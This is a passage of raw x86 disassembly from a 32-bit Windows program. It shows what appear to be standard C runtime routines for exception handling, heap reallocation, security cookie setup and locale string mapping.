  425746:	cmp    ebx,DWORD PTR ds:0x45cef8
  42574c:	jne    0x425760
  42574e:	mov    ecx,DWORD PTR [ebp-0x4]
  425751:	cmp    ecx,DWORD PTR ds:0x45cf10
  425757:	jne    0x425760
  425759:	and    DWORD PTR ds:0x45cef8,0x0
  425760:	mov    ecx,DWORD PTR [ebp-0x4]
  425763:	mov    DWORD PTR [eax],ecx
  425765:	lea    eax,[edx+0x4]
  425768:	pop    edi
  425769:	pop    esi
  42576a:	pop    ebx
  42576b:	leave  
  42576c:	ret    
  42576d:	int3   
  42576e:	int3   
  42576f:	int3   
  425770:	push   esi
  425771:	inc    ebx
  425772:	xor    dh,BYTE PTR [eax]
  425774:	pop    eax
  425775:	inc    ebx
  425776:	xor    BYTE PTR [eax],dh
  425778:	push   ebp
  425779:	mov    ebp,esp
  42577b:	sub    esp,0x8
  42577e:	push   ebx
  42577f:	push   esi
  425780:	push   edi
  425781:	push   ebp
  425782:	cld    
  425783:	mov    ebx,DWORD PTR [ebp+0xc]
  425786:	mov    eax,DWORD PTR [ebp+0x8]
  425789:	test   DWORD PTR [eax+0x4],0x6
  425790:	jne    0x425818
  425796:	mov    DWORD PTR [ebp-0x8],eax
  425799:	mov    eax,DWORD PTR [ebp+0x10]
  42579c:	mov    DWORD PTR [ebp-0x4],eax
  42579f:	lea    eax,[ebp-0x8]
  4257a2:	mov    DWORD PTR [ebx-0x4],eax
  4257a5:	mov    esi,DWORD PTR [ebx+0xc]
  4257a8:	mov    edi,DWORD PTR [ebx+0x8]
  4257ab:	cmp    esi,0xffffffff
  4257ae:	je     0x425811
  4257b0:	lea    ecx,[esi+esi*2]
  4257b3:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  4257b8:	je     0x4257ff
  4257ba:	push   esi
  4257bb:	push   ebp
  4257bc:	lea    ebp,[ebx+0x10]
  4257bf:	call   DWORD PTR [edi+ecx*4+0x4]
  4257c3:	pop    ebp
  4257c4:	pop    esi
  4257c5:	mov    ebx,DWORD PTR [ebp+0xc]
  4257c8:	or     eax,eax
  4257ca:	je     0x4257ff
  4257cc:	js     0x42580a
  4257ce:	mov    edi,DWORD PTR [ebx+0x8]
  4257d1:	push   ebx
  4257d2:	call   0x426700
  4257d7:	add    esp,0x4
  4257da:	lea    ebp,[ebx+0x10]
  4257dd:	push   esi
  4257de:	push   ebx
  4257df:	call   0x426742
  4257e4:	add    esp,0x8
  4257e7:	lea    ecx,[esi+esi*2]
  4257ea:	push   0x1
  4257ec:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257f0:	call   0x4267d6
  4257f5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257f8:	mov    DWORD PTR [ebx+0xc],eax
  4257fb:	call   DWORD PTR [edi+ecx*4+0x8]
  4257ff:	mov    edi,DWORD PTR [ebx+0x8]
  425802:	lea    ecx,[esi+esi*2]
  425805:	mov    esi,DWORD PTR [edi+ecx*4]
  425808:	jmp    0x4257ab
  42580a:	mov    eax,0x0
  42580f:	jmp    0x42582d
  425811:	mov    eax,0x1
  425816:	jmp    0x42582d
  425818:	push   ebp
  425819:	lea    ebp,[ebx+0x10]
  42581c:	push   0xffffffff
  42581e:	push   ebx
  42581f:	call   0x426742
  425824:	add    esp,0x8
  425827:	pop    ebp
  425828:	mov    eax,0x1
  42582d:	pop    ebp
  42582e:	pop    edi
  42582f:	pop    esi
  425830:	pop    ebx
  425831:	mov    esp,ebp
  425833:	pop    ebp
  425834:	ret    
  425835:	push   ebp
  425836:	mov    ecx,DWORD PTR [esp+0x8]
  42583a:	mov    ebp,DWORD PTR [ecx]
  42583c:	mov    eax,DWORD PTR [ecx+0x1c]
  42583f:	push   eax
  425840:	mov    eax,DWORD PTR [ecx+0x18]
  425843:	push   eax
  425844:	call   0x426742
  425849:	add    esp,0x8
  42584c:	pop    ebp
  42584d:	ret    0x4
  425850:	call   0x42375d
  425855:	add    eax,0x8
  425858:	ret    
  425859:	push   0x14
  42585b:	push   0x428770
  425860:	call   0x4238a8
  425865:	mov    edi,DWORD PTR [ebp+0x8]
  425868:	xor    ebx,ebx
  42586a:	cmp    edi,ebx
  42586c:	jne    0x42587c
  42586e:	push   DWORD PTR [ebp+0xc]
  425871:	call   0x4245d2
  425876:	pop    ecx
  425877:	jmp    0x425a00
  42587c:	mov    esi,DWORD PTR [ebp+0xc]
  42587f:	cmp    esi,ebx
  425881:	jne    0x42588f
  425883:	push   edi
  425884:	call   0x4244ba
  425889:	pop    ecx
  42588a:	jmp    0x4259fe
  42588f:	cmp    DWORD PTR ds:0x45d144,0x3
  425896:	jne    0x4259ca
  42589c:	mov    DWORD PTR [ebp-0x1c],ebx
  42589f:	cmp    esi,0xffffffe0
  4258a2:	ja     0x425999
  4258a8:	push   0x4
  4258aa:	call   0x423a6f
  4258af:	pop    ecx
  4258b0:	mov    DWORD PTR [ebp-0x4],ebx
  4258b3:	push   edi
  4258b4:	call   0x424c92
  4258b9:	pop    ecx
  4258ba:	mov    DWORD PTR [ebp-0x20],eax
  4258bd:	cmp    eax,ebx
  4258bf:	je     0x425969
  4258c5:	cmp    esi,DWORD PTR ds:0x45cf04
  4258cb:	ja     0x425919
  4258cd:	push   esi
  4258ce:	push   edi
  4258cf:	push   eax
  4258d0:	call   0x425192
  4258d5:	add    esp,0xc
  4258d8:	test   eax,eax
  4258da:	je     0x4258e1
  4258dc:	mov    DWORD PTR [ebp-0x1c],edi
  4258df:	jmp    0x425919
  4258e1:	push   esi
  4258e2:	call   0x425471
  4258e7:	pop    ecx
  4258e8:	mov    DWORD PTR [ebp-0x1c],eax
  4258eb:	cmp    eax,ebx
  4258ed:	je     0x425919
  4258ef:	mov    eax,DWORD PTR [edi-0x4]
  4258f2:	dec    eax
  4258f3:	mov    DWORD PTR [ebp-0x24],eax
  4258f6:	cmp    eax,esi
  4258f8:	jb     0x4258fc
  4258fa:	mov    eax,esi
  4258fc:	push   eax
  4258fd:	push   edi
  4258fe:	push   DWORD PTR [ebp-0x1c]
  425901:	call   0x4245f0
  425906:	push   edi
  425907:	call   0x424c92
  42590c:	mov    DWORD PTR [ebp-0x20],eax
  42590f:	push   edi
  425910:	push   eax
  425911:	call   0x424cbd
  425916:	add    esp,0x18
  425919:	cmp    DWORD PTR [ebp-0x1c],ebx
  42591c:	jne    0x425969
  42591e:	cmp    esi,ebx
  425920:	jne    0x425928
  425922:	xor    esi,esi
  425924:	inc    esi
  425925:	mov    DWORD PTR [ebp+0xc],esi
  425928:	add    esi,0xf
  42592b:	and    esi,0xfffffff0
  42592e:	mov    DWORD PTR [ebp+0xc],esi
  425931:	push   esi
  425932:	push   ebx
  425933:	push   DWORD PTR ds:0x45d140
  425939:	call   DWORD PTR ds:0x4280a8
  42593f:	mov    DWORD PTR [ebp-0x1c],eax
  425942:	cmp    eax,ebx
  425944:	je     0x425969
  425946:	mov    eax,DWORD PTR [edi-0x4]
  425949:	dec    eax
  42594a:	mov    DWORD PTR [ebp-0x24],eax
  42594d:	cmp    eax,esi
  42594f:	jb     0x425953
  425951:	mov    eax,esi
  425953:	push   eax
  425954:	push   edi
  425955:	push   DWORD PTR [ebp-0x1c]
  425958:	call   0x4245f0
  42595d:	push   edi
  42595e:	push   DWORD PTR [ebp-0x20]
  425961:	call   0x424cbd
  425966:	add    esp,0x14
  425969:	or     DWORD PTR [ebp-0x4],0xffffffff
  42596d:	call   0x4259c1
  425972:	cmp    DWORD PTR [ebp-0x20],ebx
  425975:	jne    0x425999
  425977:	cmp    esi,ebx
  425979:	jne    0x42597e
  42597b:	xor    esi,esi
  42597d:	inc    esi
  42597e:	add    esi,0xf
  425981:	and    esi,0xfffffff0
  425984:	mov    DWORD PTR [ebp+0xc],esi
  425987:	push   esi
  425988:	push   edi
  425989:	push   ebx
  42598a:	push   DWORD PTR ds:0x45d140
  425990:	call   DWORD PTR ds:0x4280b4
  425996:	mov    DWORD PTR [ebp-0x1c],eax
  425999:	mov    eax,DWORD PTR [ebp-0x1c]
  42599c:	cmp    eax,ebx
  42599e:	jne    0x425a00
  4259a0:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a6:	je     0x425a00
  4259a8:	push   esi
  4259a9:	call   0x426192
  4259ae:	pop    ecx
  4259af:	test   eax,eax
  4259b1:	jne    0x42589c
  4259b7:	jmp    0x4259fe
  4259b9:	xor    ebx,ebx
  4259bb:	mov    esi,DWORD PTR [ebp+0xc]
  4259be:	mov    edi,DWORD PTR [ebp+0x8]
  4259c1:	push   0x4
  4259c3:	call   0x4239db
  4259c8:	pop    ecx
  4259c9:	ret    
  4259ca:	xor    eax,eax
  4259cc:	cmp    esi,0xffffffe0
  4259cf:	ja     0x4259e7
  4259d1:	cmp    esi,ebx
  4259d3:	jne    0x4259d8
  4259d5:	xor    esi,esi
  4259d7:	inc    esi
  4259d8:	push   esi
  4259d9:	push   edi
  4259da:	push   ebx
  4259db:	push   DWORD PTR ds:0x45d140
  4259e1:	call   DWORD PTR ds:0x4280b4
  4259e7:	cmp    eax,ebx
  4259e9:	jne    0x425a00
  4259eb:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259f1:	je     0x425a00
  4259f3:	push   esi
  4259f4:	call   0x426192
  4259f9:	pop    ecx
  4259fa:	test   eax,eax
  4259fc:	jne    0x4259ca
  4259fe:	xor    eax,eax
  425a00:	call   0x4238e3
  425a05:	ret    
  425a06:	push   0x10
  425a08:	push   0x428780
  425a0d:	call   0x4238a8
  425a12:	cmp    DWORD PTR ds:0x45d144,0x3
  425a19:	jne    0x425a55
  425a1b:	push   0x4
  425a1d:	call   0x423a6f
  425a22:	pop    ecx
  425a23:	and    DWORD PTR [ebp-0x4],0x0
  425a27:	mov    esi,DWORD PTR [ebp+0x8]
  425a2a:	push   esi
  425a2b:	call   0x424c92
  425a30:	pop    ecx
  425a31:	mov    DWORD PTR [ebp-0x1c],eax
  425a34:	test   eax,eax
  425a36:	je     0x425a43
  425a38:	mov    esi,DWORD PTR [esi-0x4]
  425a3b:	sub    esi,0x9
  425a3e:	mov    DWORD PTR [ebp-0x20],esi
  425a41:	jmp    0x425a46
  425a43:	mov    esi,DWORD PTR [ebp-0x20]
  425a46:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a4a:	call   0x425a73
  425a4f:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a53:	jne    0x425a68
  425a55:	push   DWORD PTR [ebp+0x8]
  425a58:	push   0x0
  425a5a:	push   DWORD PTR ds:0x45d140
  425a60:	call   DWORD PTR ds:0x4280b8
  425a66:	mov    esi,eax
  425a68:	mov    eax,esi
  425a6a:	call   0x4238e3
  425a6f:	ret    
  425a70:	mov    esi,DWORD PTR [ebp-0x20]
  425a73:	push   0x4
  425a75:	call   0x4239db
  425a7a:	pop    ecx
  425a7b:	ret    
  425a7c:	push   ebp
  425a7d:	mov    ebp,esp
  425a7f:	sub    esp,0x10
  425a82:	push   esi
  425a83:	lea    eax,[ebp-0x8]
  425a86:	push   eax
  425a87:	call   DWORD PTR ds:0x4280c8
  425a8d:	mov    esi,DWORD PTR [ebp-0x4]
  425a90:	xor    esi,DWORD PTR [ebp-0x8]
  425a93:	call   DWORD PTR ds:0x4280c4
  425a99:	xor    esi,eax
  425a9b:	call   DWORD PTR ds:0x428070
  425aa1:	xor    esi,eax
  425aa3:	call   DWORD PTR ds:0x4280c0
  425aa9:	xor    esi,eax
  425aab:	lea    eax,[ebp-0x10]
  425aae:	push   eax
  425aaf:	call   DWORD PTR ds:0x4280bc
  425ab5:	mov    eax,DWORD PTR [ebp-0xc]
  425ab8:	xor    eax,DWORD PTR [ebp-0x10]
  425abb:	xor    esi,eax
  425abd:	mov    DWORD PTR ds:0x45c430,esi
  425ac3:	jne    0x425acf
  425ac5:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425acf:	pop    esi
  425ad0:	leave  
  425ad1:	ret    
  425ad2:	push   0x118
  425ad7:	push   0x428930
  425adc:	call   0x4238a8
  425ae1:	mov    eax,ds:0x45c430
  425ae6:	xor    eax,DWORD PTR [ebp+0x4]
  425ae9:	mov    DWORD PTR [ebp-0x1c],eax
  425aec:	mov    eax,ds:0x45cd98
  425af1:	xor    ecx,ecx
  425af3:	cmp    eax,ecx
  425af5:	je     0x425b16
  425af7:	mov    DWORD PTR [ebp-0x4],ecx
  425afa:	push   DWORD PTR [ebp+0xc]
  425afd:	push   DWORD PTR [ebp+0x8]
  425b00:	call   eax
  425b02:	pop    ecx
  425b03:	pop    ecx
  425b04:	or     DWORD PTR [ebp-0x4],0xffffffff
  425b08:	jmp    0x425c14
  425b0d:	xor    eax,eax
  425b0f:	inc    eax
  425b10:	ret    
  425b11:	mov    esp,DWORD PTR [ebp-0x18]
  425b14:	jmp    0x425b04
  425b16:	mov    eax,DWORD PTR [ebp+0x8]
  425b19:	dec    eax
  425b1a:	je     0x425b2f
  425b1c:	mov    edi,0x42890c
  425b21:	mov    DWORD PTR [ebp-0x20],0x428858
  425b28:	mov    esi,0xd4
  425b2d:	jmp    0x425b40
  425b2f:	mov    edi,0x428838
  425b34:	mov    DWORD PTR [ebp-0x20],0x428798
  425b3b:	mov    esi,0xb9
  425b40:	mov    BYTE PTR [ebp-0x24],cl
  425b43:	push   0x104
  425b48:	lea    eax,[ebp-0x128]
  425b4e:	push   eax
  425b4f:	push   ecx
  425b50:	call   DWORD PTR ds:0x428040
  425b56:	test   eax,eax
  425b58:	jne    0x425b6d
  425b5a:	push   0x42848c
  425b5f:	lea    eax,[ebp-0x128]
  425b65:	push   eax
  425b66:	call   0x423c90
  425b6b:	pop    ecx
  425b6c:	pop    ecx
  425b6d:	lea    ebx,[ebp-0x128]
  425b73:	lea    eax,[ebp-0x128]
  425b79:	push   eax
  425b7a:	call   0x423ec0
  425b7f:	pop    ecx
  425b80:	add    eax,0xb
  425b83:	cmp    eax,0x3c
  425b86:	jbe    0x425bb1
  425b88:	lea    eax,[ebp-0x128]
  425b8e:	push   eax
  425b8f:	call   0x423ec0
  425b94:	mov    ebx,eax
  425b96:	lea    eax,[ebp-0x128]
  425b9c:	sub    eax,0x31
  425b9f:	add    ebx,eax
  425ba1:	push   0x3
  425ba3:	push   0x428488
  425ba8:	push   ebx
  425ba9:	call   0x423d90
  425bae:	add    esp,0x10
  425bb1:	push   ebx
  425bb2:	call   0x423ec0
  425bb7:	pop    ecx
  425bb8:	lea    eax,[eax+esi*1+0xc]
  425bbc:	add    eax,0x3
  425bbf:	and    eax,0xfffffffc
  425bc2:	call   0x423900
  425bc7:	mov    DWORD PTR [ebp-0x18],esp
  425bca:	mov    esi,esp
  425bcc:	push   edi
  425bcd:	push   esi
  425bce:	call   0x423c90
  425bd3:	mov    edi,0x428468
  425bd8:	push   edi
  425bd9:	push   esi
  425bda:	call   0x423ca0
  425bdf:	push   0x42878c
  425be4:	push   esi
  425be5:	call   0x423ca0
  425bea:	push   ebx
  425beb:	push   esi
  425bec:	call   0x423ca0
  425bf1:	push   edi
  425bf2:	push   esi
  425bf3:	call   0x423ca0
  425bf8:	push   DWORD PTR [ebp-0x20]
  425bfb:	push   esi
  425bfc:	call   0x423ca0
  425c01:	push   0x12010
  425c06:	push   0x428440
  425c0b:	push   esi
  425c0c:	call   0x423b92
  425c11:	add    esp,0x3c
  425c14:	push   0x3
  425c16:	call   0x422d16
  425c1b:	int3   
  425c1c:	push   0x38
  425c1e:	push   0x428d50
  425c23:	call   0x4238a8
  425c28:	xor    ebx,ebx
  425c2a:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425c30:	jne    0x425c6a
  425c32:	push   ebx
  425c33:	push   ebx
  425c34:	xor    esi,esi
  425c36:	inc    esi
  425c37:	push   esi
  425c38:	push   0x428d4c
  425c3d:	push   0x100
  425c42:	push   ebx
  425c43:	call   DWORD PTR ds:0x4280d4
  425c49:	test   eax,eax
  425c4b:	je     0x425c55
  425c4d:	mov    DWORD PTR ds:0x45cdbc,esi
  425c53:	jmp    0x425c6a
  425c55:	call   DWORD PTR ds:0x428014
  425c5b:	cmp    eax,0x78
  425c5e:	jne    0x425c6a
  425c60:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c6a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c6d:	jle    0x425c8a
  425c6f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c72:	mov    eax,DWORD PTR [ebp+0x10]
  425c75:	dec    ecx
  425c76:	cmp    BYTE PTR [eax],bl
  425c78:	je     0x425c82
  425c7a:	inc    eax
  425c7b:	cmp    ecx,ebx
  425c7d:	jne    0x425c75
  425c7f:	or     ecx,0xffffffff
  425c82:	or     eax,0xffffffff
  425c85:	sub    eax,ecx
  425c87:	add    DWORD PTR [ebp+0x14],eax
  425c8a:	mov    eax,ds:0x45cdbc
  425c8f:	cmp    eax,0x2
  425c92:	je     0x425e74
  425c98:	cmp    eax,ebx
  425c9a:	je     0x425e74
  425ca0:	cmp    eax,0x1
  425ca3:	jne    0x425ea7
  425ca9:	xor    edi,edi
  425cab:	mov    DWORD PTR [ebp-0x1c],edi
  425cae:	mov    DWORD PTR [ebp-0x20],ebx
  425cb1:	mov    DWORD PTR [ebp-0x24],ebx
  425cb4:	cmp    DWORD PTR [ebp+0x20],ebx
  425cb7:	jne    0x425cc1
  425cb9:	mov    eax,ds:0x45cdb4
  425cbe:	mov    DWORD PTR [ebp+0x20],eax
  425cc1:	push   ebx
  425cc2:	push   ebx
  425cc3:	push   DWORD PTR [ebp+0x14]
  425cc6:	push   DWORD PTR [ebp+0x10]
  425cc9:	xor    eax,eax
  425ccb:	cmp    DWORD PTR [ebp+0x24],ebx
  425cce:	setne  al
  425cd1:	lea    eax,[eax*8+0x1]
  425cd8:	push   eax
  425cd9:	push   DWORD PTR [ebp+0x20]
  425cdc:	call   DWORD PTR ds:0x4280d0
  425ce2:	mov    esi,eax
  425ce4:	mov    DWORD PTR [ebp-0x28],esi
  425ce7:	cmp    esi,ebx
  425ce9:	je     0x425ea7
  425cef:	mov    DWORD PTR [ebp-0x4],0x1
  425cf6:	lea    eax,[esi+esi*1]
  425cf9:	add    eax,0x3
  425cfc:	and    eax,0xfffffffc
  425cff:	call   0x423900
  425d04:	mov    DWORD PTR [ebp-0x18],esp
  425d07:	mov    eax,esp
  425d09:	mov    DWORD PTR [ebp-0x2c],eax
  425d0c:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d10:	jmp    0x425d2d
  425d12:	xor    eax,eax
  425d14:	inc    eax
  425d15:	ret    
  425d16:	mov    esp,DWORD PTR [ebp-0x18]
  425d19:	call   0x426d45
  425d1e:	xor    ebx,ebx
  425d20:	mov    DWORD PTR [ebp-0x2c],ebx
  425d23:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d27:	mov    edi,DWORD PTR [ebp-0x1c]
  425d2a:	mov    esi,DWORD PTR [ebp-0x28]
  425d2d:	cmp    DWORD PTR [ebp-0x2c],ebx
  425d30:	jne    0x425d4e
  425d32:	lea    eax,[esi+esi*1]
  425d35:	push   eax
  425d36:	call   0x4245d2
  425d3b:	pop    ecx
  425d3c:	mov    DWORD PTR [ebp-0x2c],eax
  425d3f:	cmp    eax,ebx
  425d41:	je     0x425ea7
  425d47:	mov    DWORD PTR [ebp-0x20],0x1
  425d4e:	push   esi
  425d4f:	push   DWORD PTR [ebp-0x2c]
  425d52:	push   DWORD PTR [ebp+0x14]
  425d55:	push   DWORD PTR [ebp+0x10]
  425d58:	push   0x1
  425d5a:	push   DWORD PTR [ebp+0x20]
  425d5d:	call   DWORD PTR ds:0x4280d0
  425d63:	test   eax,eax
  425d65:	je     0x425e51
  425d6b:	push   ebx
  425d6c:	push   ebx
  425d6d:	push   esi
  425d6e:	push   DWORD PTR [ebp-0x2c]
  425d71:	push   DWORD PTR [ebp+0xc]
  425d74:	push   DWORD PTR [ebp+0x8]
  425d77:	call   DWORD PTR ds:0x4280d4
  425d7d:	mov    edi,eax
  425d7f:	mov    DWORD PTR [ebp-0x1c],edi
  425d82:	cmp    edi,ebx
  425d84:	je     0x425e51
  425d8a:	test   BYTE PTR [ebp+0xd],0x4
  425d8e:	je     0x425dbd
  425d90:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d93:	je     0x425e51
  425d99:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d9c:	jg     0x425e51
  425da2:	push   DWORD PTR [ebp+0x1c]
  425da5:	push   DWORD PTR [ebp+0x18]
  425da8:	push   esi
  425da9:	push   DWORD PTR [ebp-0x2c]
  425dac:	push   DWORD PTR [ebp+0xc]
  425daf:	push   DWORD PTR [ebp+0x8]
  425db2:	call   DWORD PTR ds:0x4280d4
  425db8:	jmp    0x425e51
  425dbd:	mov    DWORD PTR [ebp-0x4],0x2
  425dc4:	lea    eax,[edi+edi*1]
  425dc7:	add    eax,0x3
  425dca:	and    eax,0xfffffffc
  425dcd:	call   0x423900
  425dd2:	mov    DWORD PTR [ebp-0x18],esp
  425dd5:	mov    eax,esp
  425dd7:	mov    DWORD PTR [ebp-0x30],eax
  425dda:	or     DWORD PTR [ebp-0x4],0xffffffff
  425dde:	jmp    0x425dfb
  425de0:	xor    eax,eax
  425de2:	inc    eax
  425de3:	ret    
  425de4:	mov    esp,DWORD PTR [ebp-0x18]
  425de7:	call   0x426d45
  425dec:	xor    ebx,ebx
  425dee:	mov    DWORD PTR [ebp-0x30],ebx
  425df1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425df5:	mov    edi,DWORD PTR [ebp-0x1c]
  425df8:	mov    esi,DWORD PTR [ebp-0x28]
  425dfb:	cmp    DWORD PTR [ebp-0x30],ebx
  425dfe:	jne    0x425e18
  425e00:	lea    eax,[edi+edi*1]
  425e03:	push   eax
  425e04:	call   0x4245d2
  425e09:	pop    ecx
  425e0a:	mov    DWORD PTR [ebp-0x30],eax
  425e0d:	cmp    eax,ebx
  425e0f:	je     0x425e51
  425e11:	mov    DWORD PTR [ebp-0x24],0x1
  425e18:	push   edi
  425e19:	push   DWORD PTR [ebp-0x30]
  425e1c:	push   esi
  425e1d:	push   DWORD PTR [ebp-0x2c]
  425e20:	push   DWORD PTR [ebp+0xc]
  425e23:	push   DWORD PTR [ebp+0x8]
  425e26:	call   DWORD PTR ds:0x4280d4
  425e2c:	test   eax,eax
  425e2e:	je     0x425e51
  425e30:	push   ebx
  425e31:	push   ebx
  425e32:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e35:	jne    0x425e3b
  425e37:	push   ebx
  425e38:	push   ebx
  425e39:	jmp    0x425e41
  425e3b:	push   DWORD PTR [ebp+0x1c]
  425e3e:	push   DWORD PTR [ebp+0x18]
  425e41:	push   edi
  425e42:	push   DWORD PTR [ebp-0x30]
  425e45:	push   ebx
  425e46:	push   DWORD PTR [ebp+0x20]
  425e49:	call   DWORD PTR ds:0x428054
  425e4f:	mov    edi,eax
  425e51:	cmp    DWORD PTR [ebp-0x24],ebx
  425e54:	je     0x425e5f
  425e56:	push   DWORD PTR [ebp-0x30]
  425e59:	call   0x4244ba
  425e5e:	pop    ecx
  425e5f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e62:	je     0x425e6d
  425e64:	push   DWORD PTR [ebp-0x2c]
  425e67:	call   0x4244ba
  425e6c:	pop    ecx
  425e6d:	mov    eax,edi
  425e6f:	jmp    0x425fcf
  425e74:	mov    DWORD PTR [ebp-0x34],ebx
  425e77:	xor    edi,edi
  425e79:	mov    DWORD PTR [ebp-0x38],ebx
  425e7c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e7f:	jne    0x425e89
  425e81:	mov    eax,ds:0x45cda4
  425e86:	mov    DWORD PTR [ebp+0x8],eax
  425e89:	cmp    DWORD PTR [ebp+0x20],ebx
  425e8c:	jne    0x425e96
  425e8e:	mov    eax,ds:0x45cdb4
  425e93:	mov    DWORD PTR [ebp+0x20],eax
  425e96:	push   DWORD PTR [ebp+0x8]
  425e99:	call   0x426b2d
  425e9e:	pop    ecx
  425e9f:	mov    DWORD PTR [ebp-0x3c],eax
  425ea2:	cmp    eax,0xffffffff
  425ea5:	jne    0x425eae
  425ea7:	xor    eax,eax
  425ea9:	jmp    0x425fcf
  425eae:	cmp    eax,DWORD PTR [ebp+0x20]
  425eb1:	je     0x425fa5
  425eb7:	push   ebx
  425eb8:	push   ebx
  425eb9:	lea    ecx,[ebp+0x14]
  425ebc:	push   ecx
  425ebd:	push   DWORD PTR [ebp+0x10]
  425ec0:	push   eax
  425ec1:	push   DWORD PTR [ebp+0x20]
  425ec4:	call   0x426b76
  425ec9:	add    esp,0x18
  425ecc:	mov    DWORD PTR [ebp-0x34],eax
  425ecf:	cmp    eax,ebx
  425ed1:	je     0x425ea7
  425ed3:	push   ebx
  425ed4:	push   ebx
  425ed5:	push   DWORD PTR [ebp+0x14]
  425ed8:	push   eax
  425ed9:	push   DWORD PTR [ebp+0xc]
  425edc:	push   DWORD PTR [ebp+0x8]
  425edf:	call   DWORD PTR ds:0x4280cc
  425ee5:	mov    esi,eax
  425ee7:	mov    DWORD PTR [ebp-0x40],esi
  425eea:	cmp    esi,ebx
  425eec:	je     0x425f94
  425ef2:	mov    DWORD PTR [ebp-0x4],ebx
  425ef5:	add    eax,0x3
  425ef8:	and    eax,0xfffffffc
  425efb:	call   0x423900
  425f00:	mov    DWORD PTR [ebp-0x18],esp
  425f03:	mov    edi,esp
  425f05:	mov    DWORD PTR [ebp-0x44],edi
  425f08:	push   esi
  425f09:	push   ebx
  425f0a:	push   edi
  425f0b:	call   0x4261b0
  425f10:	add    esp,0xc
  425f13:	jmp    0x425f25
  425f15:	xor    eax,eax
  425f17:	inc    eax
  425f18:	ret    
  425f19:	mov    esp,DWORD PTR [ebp-0x18]
  425f1c:	call   0x426d45
  425f21:	xor    ebx,ebx
  425f23:	xor    edi,edi
  425f25:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f29:	cmp    edi,ebx
  425f2b:	jne    0x425f50
  425f2d:	push   DWORD PTR [ebp-0x40]
  425f30:	call   0x4245d2
  425f35:	pop    ecx
  425f36:	mov    edi,eax
  425f38:	cmp    edi,ebx
  425f3a:	je     0x425f6d
  425f3c:	push   DWORD PTR [ebp-0x40]
  425f3f:	push   ebx
  425f40:	push   edi
  425f41:	call   0x4261b0
  425f46:	add    esp,0xc
  425f49:	mov    DWORD PTR [ebp-0x38],0x1
  425f50:	push   DWORD PTR [ebp-0x40]
  425f53:	push   edi
  425f54:	push   DWORD PTR [ebp+0x14]
  425f57:	push   DWORD PTR [ebp-0x34]
  425f5a:	push   DWORD PTR [ebp+0xc]
  425f5d:	push   DWORD PTR [ebp+0x8]
  425f60:	call   DWORD PTR ds:0x4280cc
  425f66:	mov    DWORD PTR [ebp-0x40],eax
  425f69:	cmp    eax,ebx
  425f6b:	jne    0x425f71
  425f6d:	xor    esi,esi
  425f6f:	jmp    0x425f97
  425f71:	push   DWORD PTR [ebp+0x1c]
  425f74:	push   DWORD PTR [ebp+0x18]
  425f77:	lea    eax,[ebp-0x40]
  425f7a:	push   eax
  425f7b:	push   edi
  425f7c:	push   DWORD PTR [ebp+0x20]
  425f7f:	push   DWORD PTR [ebp-0x3c]
  425f82:	call   0x426b76
  425f87:	add    esp,0x18
  425f8a:	mov    esi,eax
  425f8c:	neg    esi
  425f8e:	sbb    esi,esi
  425f90:	neg    esi
  425f92:	jmp    0x425f97
  425f94:	mov    esi,DWORD PTR [ebp-0x48]
  425f97:	cmp    DWORD PTR [ebp-0x38],ebx
  425f9a:	je     0x425fbf
  425f9c:	push   edi
  425f9d:	call   0x4244ba
  425fa2:	pop    ecx
  425fa3:	jmp    0x425fbf
  425fa5:	push   DWORD PTR [ebp+0x1c]
  425fa8:	push   DWORD PTR [ebp+0x18]
  425fab:	push   DWORD PTR [ebp+0x14]
  425fae:	push   DWORD PTR [ebp+0x10]
  425fb1:	push   DWORD PTR [ebp+0xc]
  425fb4:	push   DWORD PTR [ebp+0x8]
  425fb7:	call   DWORD PTR ds:0x4280cc
  425fbd:	mov    esi,eax
  425fbf:	cmp    DWORD PTR [ebp-0x34],ebx
  425fc2:	je     0x425fcd
  425fc4:	push   DWORD PTR [ebp-0x34]
  425fc7:	call   0x4244ba
  425fcc:	pop    ecx
  425fcd:	mov    eax,esi
  425fcf:	lea    esp,[ebp-0x54]
  425fd2:	call   0x4238e3
  425fd7:	ret    
  425fd8:	push   0x1c
  425fda:	push   0x428d78
  425fdf:	call   0x4238a8
  425fe4:	xor    esi,esi
  425fe6:	cmp    DWORD PTR ds:0x45cdc0,esi
  425fec:	jne    0x426023
  425fee:	lea    eax,[ebp-0x1c]
  425ff1:	push   eax
  425ff2:	xor    edi,edi
  425ff4:	inc    edi
  425ff5:	push   edi
  425ff6:	push   0x428d4c
  425ffb:	push   edi
  425ffc:	call   DWORD PTR ds:0x4280dc
  426002:	test   eax,eax
  426004:	je     0x42600e
  426006:	mov    DWORD PTR ds:0x45cdc0,edi
  42600c:	jmp    0x426023
  42600e:	call   DWORD PTR ds:0x428014
  426014:	cmp    eax,0x78
  426017:	jne    0x426023
  426019:	mov    DWORD PTR ds:0x45cdc0,0x2
  426023:	mov    eax,ds:0x45cdc0
  426028:	cmp    eax,0x2
  42602b:	je     0x42611b
  426031:	cmp    eax,esi
  426033:	je     0x42611b
  426039:	cmp    eax,0x1
  42603c:	jne    0x426141
  426042:	mov    DWORD PTR [ebp-0x20],esi
  426045:	mov    DWORD PTR [ebp-0x24],esi
  426048:	cmp    DWORD PTR [ebp+0x18],esi
  42604b:	jne    0x426055
  42604d:	mov    eax,ds:0x45cdb4
  426052:	mov    DWORD PTR [ebp+0x18],eax
  426055:	push   esi
  426056:	push   esi
  426057:	push   DWORD PTR [ebp+0x10]
  42605a:	push   DWORD PTR [ebp+0xc]
